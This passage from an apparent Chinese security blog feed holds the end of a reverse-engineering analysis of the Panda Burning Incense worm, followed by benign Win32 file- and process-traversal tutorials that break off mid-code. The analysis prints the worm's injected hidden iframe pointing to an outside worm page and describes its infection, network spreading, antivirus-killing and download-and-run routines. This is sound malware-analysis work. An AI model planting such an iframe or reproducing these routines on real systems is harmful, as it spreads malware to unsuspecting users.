class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=http://www.krvkr.com/worm.htm <span class="hljs-attribute">width</span>=0 <span class="hljs-attribute">height</span>=0&gt;&lt;/iframe&gt;<br></code></pre></div></td></tr></table></figure><p>感染后的文件内容</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/40.png"></p><h5 id="可执行文件感染方式（sub-40800C）"><a href="#可执行文件感染方式（sub-40800C）" class="headerlink" title="可执行文件感染方式（sub_40800C）"></a>可执行文件感染方式（sub_40800C）</h5><p>首先是判断当前程序是否正在运行，如果正在运行的话，就不感染，然后读取文件内容，比对感染标志WhBoy判断是否已经被感染，如果已经被感染的话，就不再进行感染。感染过程是将病毒复制进被感染程序之中，修改图标，在末尾再加上一个感染标志。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/41.png"></p><p>感染标志</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/42.png"></p><p>感染前后文件大小对比</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E5%8E%9F%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E6%84%9F%E6%9F%93%E5%90%8E%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F.png"></p><p>感染后的文件大小等于原文件大小加上病毒大小（60.5kb）。</p><h4 id="函数2，sub-40C5B0"><a href="#函数2，sub-40C5B0" class="headerlink" title="函数2，sub_40C5B0"></a>函数2，sub_40C5B0</h4><p>这个函数创建了一个定时器，每隔6S就执行一次。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/43.png"></p><p>首先还是获取了所有的磁盘。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/45.png"></p><p>然后是判断当前根目录下是否存在setup.exe这个文件，如果不存在将病毒主体复制过去并命名为setup.exe，如果存在的话又会读取spcolsv.exe和setup.exe的内容，判断是否相同，也就是判断setup.exe是不是病毒程序，如果不相等会将原setup.exe删除再重新复制一个。都满足的话继续后续的操作。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/44.png"></p><p>然后是对于autorun.inf的判断，也是先判断根目录下是否存在这个文件，如果不存在创建并写入内容，如果存在比对内容是否为病毒生成的内容，如果不是，则删除原始的，生成一个新的。流程与setup.exe基本上是一样的。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/46.png"></p><p>autorun.inf的内容</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/47.png"></p><p>最后会调用SetFileAttributesA函数将两个文件的属性设置为隐藏。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/48.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7%E9%9A%90%E8%97%8F.png"></p><h4 id="函数3，sub-40BD08"><a href="#函数3，sub-40BD08" class="headerlink" title="函数3，sub_40BD08"></a>函数3，sub_40BD08</h4><p>这个函数也是创建了一个线程，是循环创建了好几次，下断分析查看。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/49.png"></p><p>进来分析查看，其是创建了SOCKET通信，通过139和445端口感染局域网的共享文件夹。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/50.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/51.png"></p><p>这里我没有设置好环境，没有实现局域网感染，所以分析的可能不是很到位。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>操作2主要是创建了几个线程，sub_40A7EC是用来感染电脑盘符下的可执行文件和网页类型文件，还会在每个文件夹下创建一个desktop.ini写入当前感染的时间。sub_40C5B0每隔6S就会执行一次，遍历所有的盘符，判断盘符根目录下是否存在setup.exe（也就是病毒主体程序）和autorun.inf。sub_40BD08通过网络进行传播，可以看出来熊猫烧香的感染性，传播性确实很强。</p><h3 id="操作3"><a href="#操作3" class="headerlink" title="操作3"></a>操作3</h3><p>进来查看发现创建了四个定时器</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/52.png"></p><p>分开分析它们</p><h4 id="定时1，sub-40CD30函数"><a href="#定时1，sub-40CD30函数" class="headerlink" title="定时1，sub_40CD30函数"></a>定时1，sub_40CD30函数</h4><p>这个函数每一秒执行一次，进来后首先创建了一个线程，然后是两个对于注册表的操作，先分析一下创建的这个线程。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/54.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/53.png"></p><h5 id="创建的线程"><a href="#创建的线程" class="headerlink" title="创建的线程"></a>创建的线程</h5><p>这个线程主要是病毒的一个自我保护，其中关闭了杀毒软件，</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/55.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/56.png"></p><p>还会检测关闭许多的进程，比如说无法打开任务管理器，注册表编辑器。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/57.png"></p><h5 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h5><p>针对注册表操作主要是两个，一个是在HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run中设置键值，实现自启动</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/58.png"></p><p>另一个是修改SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue键值，实现不显示隐藏文件。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/60.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/59.png"></p><h4 id="定时2，sub-40CE8C函数"><a href="#定时2，sub-40CE8C函数" class="headerlink" title="定时2，sub_40CE8C函数"></a>定时2，sub_40CE8C函数</h4><p>这个函数每1200S运行一次（20分钟）。</p><p>它首先创建了一个线程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/61.png"></p><p>分析此线程，发现其打开了一个URL并且尝试读取一些内容。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/62.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/63.png"></p><p>并且还有一个执行的操作，猜测应该是从网页中获取到的程序来运行。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/64.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/65.png"></p><h4 id="定时3，sub-40CE94函数"><a href="#定时3，sub-40CE94函数" class="headerlink" title="定时3，sub_40CE94函数"></a>定时3，sub_40CE94函数</h4><p>每十秒执行一次。</p><p>进来后先创建了两个线程。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/66.png"></p><p>第一个线程最终会创建40C964，这个之前已经分析过了</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/67.png"></p><p>第二个线程40CC38，它是删除了所有的共享文件夹。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/68.png"></p><h4 id="定时4，sub-407540函数"><a href="#定时4，sub-407540函数" class="headerlink" title="定时4，sub_407540函数"></a>定时4，sub_407540函数</h4><p>它每隔6s执行一次，创建了一个线程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/69.png"></p><p>这里主要是关闭并删除了一些服务和将一些杀软的启动项删除，</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/70.png"></p><p>关闭服务</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/71.png"></p><p>删除服务</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/72.png"></p><p>删除启动项</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/73.png"></p><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>这里主要是四个功能</p><ol><li>第一个是每秒执行关闭杀软和一些其他进程，设置自启动键值和不显示隐藏文件。</li><li>第二个每隔20分钟执行一次，会尝试下载资源并运行。</li><li>第三个每隔十秒执行一次，删除所有的共享文件夹。</li><li>每六秒执行一次，关闭删除服务，并且删除杀软的启动项。</li></ol><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>到这里整个熊猫烧香就分析完毕了，使用OD结合IDA也分析了比较长的时间，这也算是第一篇正式的一个病毒分析报告，写的可能还是有不成熟的地方，后续还要慢慢改进。</p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>熊猫烧香</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>功能技术-文件遍历</title>
    <link href="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/"/>
    <url>/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<h2 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h2><p>文件搜索功能是应用程序中最常见的功能之一，同时对于恶意代码来说也是常见的功能，比如勒索病毒就会有大量的文件操作，遍历文件来对文件进行加密。</p><p>实现文件遍历的方法有很多，最常见的便是通过API实现，这里主要涉及的是FindFirstFile,FindNextFile以及FindClose等。</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="FindFirstFile"><a href="#FindFirstFile" class="headerlink" title="FindFirstFile"></a>FindFirstFile</h3><p>在目录中搜索名称与特定名称匹配的文件或者子目录。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">HANDLE <span class="hljs-title">FindFirstFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR             lpFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPWIN32_FIND_DATAA lpFindFileData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>lpFileName：指定目录、路径、以及文件名。文件名可以包括通配符，例如“*”，“？”。此参数不应该为NULL，无效的字符串（例如，空字符串或缺少终止空字符的字符串），尾部以反斜杠（\）结尾。</p><p>如果字符串以通配符、句点“.”或者目录名称结尾，那么用户必须对路径上的根目录和所有子目录具有访问权限。</p><p>lpFindFileData：指向WIN32_FIND_DATA结构的指针，用于接收搜索到的文件或者目录的信息。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果函数成功，则返回值是在后续调用FindNextFile或者FindClose中使用的搜索句柄，lpFindFileData参数包含搜索到的第一个文件或者目录的信息。</p><p>如果函数失败或无法从lpFindFileData参数的搜索字符串中找到文件，则返回值为INVALID_HANDLE_VALUE，并且lpFindFileData的内容是不确定的。</p><h3 id="FindNextFile"><a href="#FindNextFile" class="headerlink" title="FindNextFile"></a>FindNextFile</h3><p>继续搜索文件</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">FindNextFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE             hFindFile,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPWIN32_FIND_DATAA lpFindFileData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p>hFindFile：指向前一次调用FindFirstFile或者FindFirstFileEx函数返回的搜索句柄。</p><p>lpFindFileData：指向WIN32_FIND_DATA结构的指针，该结构接收搜索到的文件或子目录的信息。</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>如果函数成功，则返回值不为0，lpFindFileData参数包含搜索到的下一个文件或者目录的信息。如果函数失败，则返回值为0，并且lpFindFileData的内容是不确定的。</p><h3 id="WIN32-FIND-DATAA-结构"><a href="#WIN32-FIND-DATAA-结构" class="headerlink" title="WIN32_FIND_DATAA 结构"></a>WIN32_FIND_DATAA 结构</h3><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">typedef struct _WIN32_FIND_DATAA &#123;<br>  <span class="hljs-type">DWORD</span>    dwFileAttributes;<br>  <span class="hljs-type">FILETIME</span> ftCreationTime;<br>  <span class="hljs-type">FILETIME</span> ftLastAccessTime;<br>  <span class="hljs-type">FILETIME</span> ftLastWriteTime;<br>  <span class="hljs-type">DWORD</span>    nFileSizeHigh;<br>  <span class="hljs-type">DWORD</span>    nFileSizeLow;<br>  <span class="hljs-type">DWORD</span>    dwReserved0;<br>  <span class="hljs-type">DWORD</span>    dwReserved1;<br>  <span class="hljs-type">CHAR</span>     cFileName[<span class="hljs-type">MAX_PATH</span>];<br>  <span class="hljs-type">CHAR</span>     cAlternateFileName[14];<br>  <span class="hljs-type">DWORD</span>    dwFileType;<br>  <span class="hljs-type">DWORD</span>    dwCreatorType;<br>  <span class="hljs-type">WORD</span>     wFinderFlags;<br>&#125; <span class="hljs-type">WIN32_FIND_DATAA</span>, *<span class="hljs-type">PWIN32_FIND_DATAA</span>, *<span class="hljs-type">LPWIN32_FIND_DATAA</span>;<br></code></pre></div></td></tr></table></figure><h4 id="成员"><a href="#成员" class="headerlink" title="成员"></a>成员</h4><p>dwFileAttributes：指定文件的文件属性。</p><p>ftCreationTime：指定文件或者目录何时创建的FILETIME结构。如果底层文件系统不支持创建时间，则此成员为0。</p><p>ftLastAccessTime：对于文件，结构指定文件最后读取、写入或者运行可执行文件的时间。</p><p>ftLastWriteTime：对于文件，该结构指定文件上次写入、截断或者覆盖的时间。</p><p>nFileSizeHigh：指定文件大小的高阶DWORD值，以字节为单位。</p><p>nFileSizeLow：指定文件大小的低阶DWORD值，以字节为单位。</p><p>dwReserved0：若dwFileAttributes成员包含FILE_ATTRIBUTE_REPARSE_POINT属性，则此成员将指定重新标记解析点。若此值未定义，则不应该使用。</p><p>dwReserved1：保留</p><p>cFileName：指向文件的名称。</p><p>cAlternateFileName：指向该文件的替代名称。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>文件的搜索功能主要是通过FindFirstFile和FindNextFile这两个函数来实现的。</p><p>首先是搜索的路径，假设当前要搜索C盘下所有的文件，那么路径就是”C:\\“，指定搜索所有的文件就加上通配符”*“，现在的路径就是”C:\\*.*“。</p><p>然后就可以调用FindFirstFile函数，进行搜索，搜索的结果保存在WIN32_FIND_DATA结构体指针指向的内存中。结构体中包含文件的各项信息。可以根据成员dwFileAttributes判断文件的属性，若文件属性是FILE_ATTRIBUTE_DIRECTORY，则说明这是一个目录，可以进行再次搜索，但是要注意要过滤掉当前目录“.”和上级目录“..”，根据cFileName获取文件的名称。</p><p>之后再调用FindNextFile函数搜索下一个文件即可，重复上述操作，直到根据返回值判断，搜索不到文件。</p><p>最后调用FindClose关闭搜索句柄。</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><p>结果太多，为了结果更好展示，将其输出到TXT文件中。搜索时再加入一个判断，只输出exe类型文件。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">findFile</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszPath)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">findFile</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">findFile</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszPath)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwBufferSize = <span class="hljs-number">4096</span>;<br><span class="hljs-keyword">char</span>* pszFileName = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span>* pszNextPath = <span class="hljs-literal">NULL</span>;<br>WIN32_FIND_DATA FileData = &#123; <span class="hljs-number">0</span> &#125;;<br>BOOL flag = FALSE;<br><span class="hljs-comment">//申请动态内存</span><br>pszFileName = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[dwBufferSize];<br>pszNextPath = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[dwBufferSize];<br><span class="hljs-comment">//搜索当前路径下的所有文件</span><br><span class="hljs-built_in">sprintf</span>(pszFileName, <span class="hljs-string">&quot;%s\\*.*&quot;</span>, pszPath);<br><span class="hljs-keyword">char</span> ext[_MAX_EXT];<br><span class="hljs-comment">//创建一个TXT文件，将结果输出</span><br>FILE* fp;<br>fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);<br>HANDLE hFile = <span class="hljs-built_in">FindFirstFile</span>(pszFileName, &amp;FileData);<br><span class="hljs-keyword">if</span> (hFile != INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-comment">//过滤掉当前目录和上级目录</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(FileData.cFileName,<span class="hljs-string">&quot;.&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(FileData.cFileName, <span class="hljs-string">&quot;..&quot;</span>))<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-comment">//拼接文件路径</span><br><span class="hljs-built_in">sprintf</span>(pszNextPath, <span class="hljs-string">&quot;%s\\%s&quot;</span>, pszPath, FileData.cFileName);<br><span class="hljs-comment">//如果是一个目录的话，继续搜索</span><br><span class="hljs-keyword">if</span> (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)<br>&#123;<br><span class="hljs-built_in">findFile</span>(pszNextPath);<br>&#125;<br><span class="hljs-comment">//不是的话就输出文件名字</span><br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//分割文件名字</span><br>_splitpath(pszNextPath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ext);<br><span class="hljs-comment">//判断是否是EXE文件</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(ext, <span class="hljs-string">&quot;.exe&quot;</span>))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, pszNextPath);<br><span class="hljs-comment">//写入文件</span><br><span class="hljs-built_in">fprintf</span>(fp, <span class="hljs-string">&quot;%s\r\n&quot;</span>, pszNextPath);<br>&#125;<br>&#125;<br><span class="hljs-comment">//继续搜索</span><br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">FindNextFile</span>(hFile, &amp;FileData));<br>&#125;<br><span class="hljs-built_in">fclose</span>(fp);<br><span class="hljs-built_in">FindClose</span>(hFile);<br><span class="hljs-keyword">delete</span> []pszNextPath;<br>pszNextPath = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">delete</span> []pszFileName;<br>pszFileName = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>运行程序，选择遍历的目录为桌面，查看结果可以看到成功输出了当前桌面所有的exe文件（包含子文件夹中的）。</p><p><img src="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/1.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>功能技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>功能技术-进程遍历</title>
    <link href="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/"/>
    <url>/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<h2 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h2><p>进程遍历就是遍历当前计算机上所有的进程信息，对于恶意代码来说，可以通过遍历获取进程的信息，可以通过这些信息来判断是否存在指定的进程，比如调试器、杀毒软件。遍历进程的方法有很多，最常用的就是通过进程快照来实现。</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="CreateToolhelp32Snapshot"><a href="#CreateToolhelp32Snapshot" class="headerlink" title="CreateToolhelp32Snapshot"></a>CreateToolhelp32Snapshot</h3><p>获取指定进程的快照，以及这些进程使用的堆、模块和线程。</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">HANDLE CreateToolhelp32Snapshot(<br>  <span class="hljs-built_in">DWORD</span> dwFlags,<br>  <span class="hljs-built_in">DWORD</span> th32ProcessID<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>dwFlags：指定快照中包含的系统内容，这个参数能够使用下列数值中的一个或者多个。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>THE32CS_INHERIT</td><td>声明快照句柄是可继承的</td></tr><tr><td>THE32CS_SNAPALL</td><td>在快照中包含系统中所有的进程和线程</td></tr><tr><td>THE32CS_SNAPHEAPLIST</td><td>在快照中包含在the32ProcessID中指定进程的所有堆</td></tr><tr><td>THE32CS_SNAPMODULE</td><td>在快照中包含在the32ProcessID中指定进程的所有模块</td></tr><tr><td>THE32CS_SNAPPROCESS</td><td>在快照中包含系统中所有的进程</td></tr><tr><td>THE32CS_SNAPTHREAD</td><td>在快照中包含系统中所有的线程</td></tr></tbody></table><p>th32ProcessID：指定将要快照的进程ID。如果该参数为0，则表示快照当前进程。该参数只有在设置了THE32CS_SNAPHEAPLIST或者THE32CS_SNAPMODULE后才有效，其他情况下应该忽略此参数，快照所有的进程。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>若调用成功，则返回快照的句柄；若调用失败，则返回INVALID_HANDLE_VALUE。</p><h3 id="Process32First"><a href="#Process32First" class="headerlink" title="Process32First"></a>Process32First</h3><p>检索系统快照中遇到的第一个进程信息</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">Process32First</span><span class="hljs-params">(</span></span><br><span 